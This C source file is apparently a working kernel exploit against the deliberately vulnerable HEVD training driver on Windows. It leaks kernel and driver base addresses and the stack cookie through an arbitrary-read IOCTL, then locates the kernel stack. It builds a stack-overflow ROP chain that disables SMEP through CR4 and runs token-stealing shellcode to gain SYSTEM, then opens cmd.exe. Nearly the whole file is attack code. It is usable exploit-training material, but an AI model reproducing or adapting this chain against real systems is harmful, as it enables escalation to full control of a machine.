#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// NtQuerySysInfo_SystemModuleInformation
#define MAXIMUM_FILENAME_LENGTH 255

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
);

typedef struct _UNICODE_STRING {
    USHORT         Length;
    USHORT         MaximumLength;
    PWSTR          Buffer;
} UNICODE_STRING;

unsigned long long get_module_base(PVOID module_name)
{
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}
	ULONG len = 0;
	query(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	if (pModuleInfo == NULL) {
		printf("Could not allocate memory for module info.\n");
		return 1;
	}
	NTSTATUS status = query(SystemModuleInformation, pModuleInfo, len, &len);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 1;
	}
	for (unsigned int i = 0; i < pModuleInfo->ModulesCount; i++) {
		PVOID kernelImageBase = pModuleInfo->Modules[i].ImageBaseAddress;
		PCHAR kernelImage = (PCHAR)pModuleInfo->Modules[i].Name;

		if (strstr(kernelImage, module_name)) {
            return kernelImageBase;
		}
	}
    return 0;
}

HANDLE OpenDevice(const char* deviceName)
{
    HANDLE hDevice = CreateFileA(
        deviceName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    return hDevice;
}

BOOL ioctl(HANDLE hDevice, DWORD controlCode, LPVOID InBuf, ULONG InSize, LPVOID OutBuf, ULONG OutSize) {
    DWORD bytesReturned;
    return DeviceIoControl(
        hDevice, controlCode,
        InBuf, InSize,
        OutBuf, OutSize,
        &bytesReturned, NULL
    );
}

/*
0:  90                      nop
1:  90                      nop
2:  90                      nop
3:  65 48 8b 14 25 88 01    mov    rdx,QWORD PTR gs:0x188
a:  00 00
c:  4c 8b 82 b8 00 00 00    mov    r8,QWORD PTR [rdx+0xb8]
13: 49 8b 88 48 04 00 00    mov    rcx,QWORD PTR [r8+0x448]
1a: 48 8b 51 f8             mov    rdx,QWORD PTR [rcx-0x8]
1e: 48 83 fa 04             cmp    rdx,0x4
22: 74 05                   je     0x29
24: 48 8b 09                mov    rcx,QWORD PTR [rcx]
27: eb f1                   jmp    0x1a
29: 48 8b 41 70             mov    rax,QWORD PTR [rcx+0x70]
2d: 24 f0                   and    al,0xf0
2f: 49 89 80 b8 04 00 00    mov    QWORD PTR [r8+0x4b8],rax
36: 4d 31 ed                xor    r13,r13
39: 48 83 c4 10             add    rsp,0x10             // Restore execution
3d: c3                      ret
*/
unsigned char shellcode[] =
{
    0x90, 0x90, 0x90,
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x82,
    0xb8, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x88, 0x48, 0x04, 0x00, 0x00, 0x48,
    0x8b, 0x51, 0xf8, 0x48, 0x83, 0xfa, 0x04, 0x74, 0x05, 0x48, 0x8b, 0x09,
    0xeb, 0xf1, 0x48, 0x8b, 0x41, 0x70, 0x24, 0xf0, 0x49, 0x89, 0x80, 0xb8,
    0x04, 0x00, 0x00, 0x4d, 0x31, 0xed,
    0x48, 0x83, 0xC4, 0x10, 0xC3
};

unsigned long long write_what_where(HANDLE hDevice, PVOID what, PVOID where) {
    struct aaw {
        unsigned long long what;
        unsigned long long where;
    } data = {
        .what = (unsigned long long)what,
        .where = (unsigned long long)where
    };

    ioctl(hDevice, 0x22200B, &data, sizeof(data), NULL, 0);
}

unsigned long long leak_stack_cookie(HANDLE hDevice) {
    unsigned long long where;
    unsigned long long what = get_module_base("HEVD.sys") + 0x3000;
    write_what_where(hDevice, what, &where);
    return where;
}

void UnicodeStringToCharString(UNICODE_STRING* unicodeString, char* charString, size_t charStringSize) {

    int result = WideCharToMultiByte(
        CP_ACP,
        0,
        unicodeString->Buffer,
        unicodeString->Length / sizeof(wchar_t),
        charString,
        charStringSize,
        NULL,
        NULL
    );
}

unsigned long long stack_base[0x100] = {0, };
unsigned int stack_base_idx = 0;

int find_stack_base() {
    typedef LONG       KPRIORITY;
    typedef struct _CLIENT_ID {
        DWORD          UniqueProcess;
        DWORD          UniqueThread;
    } CLIENT_ID;

    //from http://boinc.berkeley.edu/android-boinc/boinc/lib/diagnostics_win.h
    typedef struct _VM_COUNTERS {
        // the following was inferred by painful reverse engineering
        SIZE_T		   PeakVirtualSize;	// not actually
        SIZE_T         PageFaultCount;
        SIZE_T         PeakWorkingSetSize;
        SIZE_T         WorkingSetSize;
        SIZE_T         QuotaPeakPagedPoolUsage;
        SIZE_T         QuotaPagedPoolUsage;
        SIZE_T         QuotaPeakNonPagedPoolUsage;
        SIZE_T         QuotaNonPagedPoolUsage;
        SIZE_T         PagefileUsage;
        SIZE_T         PeakPagefileUsage;
        SIZE_T         VirtualSize;		// not actually
    } VM_COUNTERS;

    typedef enum _KWAIT_REASON
    {
        Executive = 0,
        FreePage = 1,
        PageIn = 2,
        PoolAllocation = 3,
        DelayExecution = 4,
        Suspended = 5,
        UserRequest = 6,
        WrExecutive = 7,
        WrFreePage = 8,
        WrPageIn = 9,
        WrPoolAllocation = 10,
        WrDelayExecution = 11,
        WrSuspended = 12,
        WrUserRequest = 13,
        WrEventPair = 14,
        WrQueue = 15,
        WrLpcReceive = 16,
        WrLpcReply = 17,
        WrVirtualMemory = 18,
        WrPageOut = 19,
        WrRendezvous = 20,
        Spare2 = 21,
        Spare3 = 22,
        Spare4 = 23,
        Spare5 = 24,
        WrCalloutStack = 25,
        WrKernel = 26,
        WrResource = 27,
        WrPushLock = 28,
        WrMutex = 29,
        WrQuantumEnd = 30,
        WrDispatchInt = 31,
        WrPreempted = 32,
        WrYieldExecution = 33,
        WrFastMutex = 34,
        WrGuardedMutex = 35,
        WrRundown = 36,
        MaximumWaitReason = 37
    } KWAIT_REASON;

    typedef struct _SYSTEM_THREAD_INFORMATION {
        LARGE_INTEGER KernelTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER CreateTime;
        ULONG WaitTime;
        PVOID StartAddress;
        CLIENT_ID ClientId;
        KPRIORITY Priority;
        LONG BasePriority;
        ULONG ContextSwitchCount;
        ULONG ThreadState;
        KWAIT_REASON WaitReason;
    #ifdef _WIN64
        ULONG Reserved[4];
    #endif
    }SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

    typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION
    {
        SYSTEM_THREAD_INFORMATION ThreadInfo;
        PVOID StackBase;
        PVOID StackLimit;
        PVOID Win32StartAddress;
        PVOID TebAddress; /* This is only filled in on Vista and above */
        ULONG Reserved1;
        ULONG Reserved2;
        ULONG Reserved3;
    } SYSTEM_EXTENDED_THREAD_INFORMATION, *PSYSTEM_EXTENDED_THREAD_INFORMATION;
    typedef struct _SYSTEM_EXTENDED_PROCESS_INFORMATION
    {
        ULONG NextEntryOffset;
        ULONG NumberOfThreads;
        LARGE_INTEGER SpareLi1;
        LARGE_INTEGER SpareLi2;
        LARGE_INTEGER SpareLi3;
        LARGE_INTEGER CreateTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER KernelTime;
        UNICODE_STRING ImageName;
        KPRIORITY BasePriority;
        ULONG ProcessId;
        ULONG InheritedFromUniqueProcessId;
        ULONG HandleCount;
        ULONG SessionId;
        PVOID PageDirectoryBase;
        VM_COUNTERS VirtualMemoryCounters;
        SIZE_T PrivatePageCount;
        IO_COUNTERS IoCounters;
        SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1];
    } SYSTEM_EXTENDED_PROCESS_INFORMATION, *PSYSTEM_EXTENDED_PROCESS_INFORMATION;

    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemExtendedProcessInformation = 57
    } SYSTEM_INFORMATION_CLASS;

    typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
        __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
        __inout PVOID SystemInformation,
        __in ULONG SystemInformationLength,
        __out_opt PULONG ReturnLength
    );
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}
	ULONG len = 2000;
	NTSTATUS status = NULL;
	PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
	do {
		len *= 2;
		pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);
	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 1;
	}

    // Get my process name
	char ModuleName[MAX_PATH] = {0, };
    char *myProcName = NULL;
	GetModuleFileNameA(NULL, ModuleName, MAX_PATH);
    if (myProcName = strrchr(ModuleName, '\\')) {
        myProcName++;
    }

	while (pProcessInfo->NextEntryOffset != NULL) {
        // Convert pProcessInfo->ImageName to ANSI type
	    char procName[256] = {0, };
        UnicodeStringToCharString(&pProcessInfo->ImageName, procName, sizeof(procName));

        // Find my process
        if (strstr(procName, myProcName)) {
            for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
                PVOID stackBase = pProcessInfo->Threads[i].StackBase;
                PVOID stackLimit = pProcessInfo->Threads[i].StackLimit;
                stack_base[stack_base_idx++] = stackLimit;
            }
        }
        pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
	}
	return 0;

}

void Exploit()
{
    const char *deviceName = "\\\\.\\HackSysExtremeVulnerableDriver";
    unsigned long long payload[0x4000] = { 0, };
    unsigned int idx = 0;

    // Setup shellcode
    DWORD oldProtect;
    if (!VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("error: VirtualProtect\n");
        return;
    }

    HANDLE hDevice = OpenDevice(deviceName);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("error: OpenDevice\n");
        return;
    }

    // Leak ntoskrnl.exe, hevd.sys base address
    unsigned long long ntoskrnl_base = get_module_base("ntoskrnl.exe");
    unsigned long long hevd_base = get_module_base("HEVD.sys");
    if (!ntoskrnl_base || !hevd_base) {
        printf("error: cannot leak base address");
        return;
    }
    printf("[+] ntoskrnl.exe base : %p\n", ntoskrnl_base);
    printf("[+] HEVD.sys base : %p\n", hevd_base);

    // Leak stack cookie
    unsigned long long stack_cookie = leak_stack_cookie(hDevice);
    printf("[+] stack cookie : %p\n", stack_cookie);

    // Get my process's kernel thread stack base
    find_stack_base();

    unsigned long long start_addr = stack_base[stack_base_idx-2];
    unsigned long long rsp = 0;

    // Scanning stack and get rsp
    for (unsigned long long pStack = start_addr; pStack < start_addr + 0x7000; pStack += 8) {
        unsigned long long result = 0;
        write_what_where(hDevice, pStack, &result);
        if (result == 0x22200b) {
            rsp = pStack - 0x50;
            break;
        }
    }
    printf("[+] rsp : %p\n", rsp);

    // Setup payload
    unsigned long long cr4 = 0xb50ef8;
    cr4 &= ~(1ULL << 20);

    for (int i=0; i<(544-32)/8; i++) {
        payload[idx++] = 0;
    }

    payload[idx++] = (rsp - 8*5 - 0x230) ^ stack_cookie;
    for (int i=0; i<6; i++) {
        payload[idx++] = 0;
    }
    payload[idx++] = ntoskrnl_base + 0x2148c8;
    payload[idx++] = cr4;
    payload[idx++] = ntoskrnl_base + 0x3a0a87;
    payload[idx++] = shellcode;
    ioctl(hDevice, 0x222007, payload, idx*8, NULL, 0);
    return;
}

int main() {
    Exploit();
    WinExec("cmd.exe", SW_SHOW);
    return 0;
}